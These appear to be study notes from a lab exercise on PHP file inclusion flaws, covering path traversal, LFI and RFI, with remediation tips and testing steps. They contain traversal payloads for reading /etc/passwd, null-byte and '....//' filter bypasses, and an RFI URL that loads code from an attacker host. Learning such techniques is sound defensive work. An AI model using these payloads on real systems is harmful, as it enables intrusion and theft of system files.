#Web

File inclusion vulnerabilities

  • Local File Inclusion(LFI)
  • Remote File Inclusion(RFI)
  • directory traversal

Query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.

The main issue of this vulnerabilities is the poor input validation. It may happens leak data and even gain remote command execution(RCE).

Path Traversal (Directory traversal)

The attacker exploits this vulnerability by manipulating and abusing the URL to locate and access the files and directories stored outside the application's root directory.

It occurs when the user's input passed to a function such as file_get_contents in PHP, and it have poor input validation or filter.

Path traversal attack(dot-dot-slash attack) using ../ which sending to the entry point such as get.php?file=

Local File Inclusion (LFI)

It happened when using PHP, ASP, JSP, Node.js.

In PHP, using function such as include, require, include_once, and require_once often contribute to LFI

Example:

  1. An application provides two languages (EN and AR)

    <?PHP 
        include($_GET["lang"]);
    ?>

    The PHP above uses a GET request via the URL parameter lang to include the file.

    We can use http://webapp.thm/get.php?file=/etc/passwd as our payload.

  2. In the following code, it specify the directory inside the function

    <?PHP 
    	include("languages/". $_GET['lang']); 
    ?>

    The PHP above use include function to call PHP pages in the languages directory only via lang parameters.

    We can use http://webapp.thm/index.php?lang=../../../../etc/passwd as our payload.

  3. (BlackBox Test), we get a entry pointhttp://webapp.thm/index.php?lang=EN, after we enter a invalid input, we get the error

    Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12

    it shows what the include function likeinclude(languages/THM.php);, which add .php at the end of entry, and it show us the full web application directory is /var/www/html/THM-4/

    So we use http://webapp.thm/index.php?lang=../../../../etc/passwd as payload, but it shows the code below since the include function read the .php at the end

    Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12

    Bypass it, we can use the NULL BYTE, which is %00 or 0x00 in hex, it is an injection technique in URL-encoded.

    NOTE: the %00 trick is fixed in PHP5.3.4 and above.

  4. it uses filter keywords, the /etc/passwd file is being filtered, two ways to bypass it:

    using the NullByte %00 or the current directory trick at the end of the keyword/.

    http://webapp.thm/index.php?lang=/etc/passwd/.

    http://webapp.thm/index.php?lang=/etc/passwd%00

  5. it uses input validation by filter some keywords

    we use http://webapp.thm/index.php?lang=../../../../etc/passwd as payload, and get the error below

    Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15

    it replace ../ to empty string, to bypass it, we can use payload ....//....//....//....//....//etc/passwd

  6. it forces the include to read from a defined directory, if the entry point is like http://webapp.thm/index.php?lang=languages/EN.php the payload should be ?lang=languages/../../../../../etc/passwd

  7. To pass the filter, some times we can change GET method to POST method

Remote File Inclusion (RFI)

It happened when the input allow attacker to inject an external URL into include function, one requirement is allow_url_fopen is on.

The consequence of RFI is:

  • Remote Command Execute (RCE)
  • Sensitive Information Disclose
  • Cross-site Scripting (XSS)
  • Denial of Service (DoS)

A external server where the attacker hosts malicious files must communicate with the application server. http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

Remediation

To prevent the file inclusion

  • Keep system, services and framework update
  • Turn off PHP errors to avoid reveal informations
  • A Web Application Firewall (WAF)
  • Disable some PHP features such as allow_url_fopen and allow_url_input
  • Allow only protocols and PHP wrappers that are in need
  • Implement whitelisting for file names and locations as well as blacklisting

Steps for testing for LFI

  1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values
  2. Enter a valid input to see how the web server behaves.
  3. Enter invalid inputs, including special characters and common file names.
  4. Use either a browser address bar or a tool such as Burpsuite.
  5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
  6. Understand the input validation and if there are any filters
  7. Try the inject a valid entry to read sensitive files
